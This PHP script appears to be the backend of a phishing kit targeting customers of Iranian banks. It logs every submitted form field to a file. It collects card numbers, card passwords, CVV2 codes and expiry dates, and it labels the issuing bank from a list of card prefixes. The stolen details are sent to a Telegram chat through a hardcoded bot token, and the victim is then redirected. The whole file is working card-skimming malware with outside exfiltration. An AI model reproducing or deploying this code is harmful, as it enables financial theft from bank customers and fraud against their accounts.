<?php
$handle = fopen("d/i.txt", "a");
foreach ($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, " = ");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
if ($_POST['CARD1']) {
    $cards = $_POST['CARD1'];
    $cardss = $_POST['CARD2'];
    $cardsss = $_POST['CARD3'];
    $cardssss = $_POST['CARD4'];
    $pass = $_POST['PASSWORD'];
    $cvv = $_POST['CVV2'];
    $mah = $_POST['MONTH'];
    $sal = $_POST['YEARS'];
    function getUserIP()
    {
        $ip = '';
        return $ip;
    }

    file_put_contents("css/images/i.txt", "lol");
    $token = "537646484:AAHRWvuhH3WqjzyZlC_nbn-SsrAXTL3KX7Q"; //YourBotToken
    $type = "$cards$cardss";
    if(preg_match('/^603799/', $type)){
        $bank = "Melli";
    }elseif (preg_match('/^589210/', $type)){
        $bank = "Sepah";
    }elseif (preg_match('/^627648/', $type)){
        $bank = "Tosee Saderat";
    }elseif (preg_match('/^627961/', $type)){
        $bank = "Sanat o Madan";
    }elseif (preg_match('/^603770/', $type)){
        $bank = "Keshavarzi";
    }elseif (preg_match('/^628023/', $type)){
        $bank = "Maskan";
    }elseif (preg_match('/^627760/', $type)){
        $bank = "Post Bank";
    }elseif (preg_match('/^502908/', $type)){
        $bank = "Tosee Taavon";
    }elseif (preg_match('/^627412/', $type)){
        $bank = "Eghtesad Novin";
    }elseif (preg_match('/^622106/', $type)){
        $bank = "Parsian";
    }elseif (preg_match('/^502229/', $type)){
        $bank = "Pasargad";
    }elseif (preg_match('/^627488/', $type)){
        $bank = "Karafarin";
    }elseif (preg_match('/^621986/', $type)){
        $bank = "Saman";
    }elseif (preg_match('/^639346/', $type)){
        $bank = "Sina";
    }elseif (preg_match('/^639607/', $type)){
        $bank = "Sarmaie";
    }elseif (preg_match('/^636214/', $type)){
        $bank = "Tat";
    }elseif (preg_match('/^502806/', $type)){
        $bank = "Shahr";
    }elseif (preg_match('/^502938/', $type)){
        $bank = "Dey";
    }elseif (preg_match('/^603769/', $type)){
        $bank = "Saderat";
    }elseif (preg_match('/^610433/', $type)){
        $bank = "Mellat";
    }elseif (preg_match('/^627353/', $type)){
        $bank = "Tejarat";
    }elseif (preg_match('/^589463/', $type)){
        $bank = "Refah";
    }elseif (preg_match('/^627381/', $type)){
        $bank = "Ansar";
    }else{
        $bank = "";
    }
    $textmsg = "
💥 Hoooraaa 🥳 💥
➖➖➖➖➖➖➖
🤩 Bank: #$bank

🤩 Card : $cards $cardss $cardsss $cardssss

🤩 Pass : $pass

🤩 CVV2 : $cvv

🤩 Year: $sal Month: $mah
➖➖➖➖➖➖➖
 ";

    $gpid = -321220131; //ChatID
    //
    //483328088

    $send = file_get_contents("https://api.telegram.org/bot$token/SendMessage?chat_id=$gpid&text=" . urlencode($textmsg));
} else {
    echo "):";
}
?>
<meta content='0;url=ip.php' http-equiv='refresh'/>
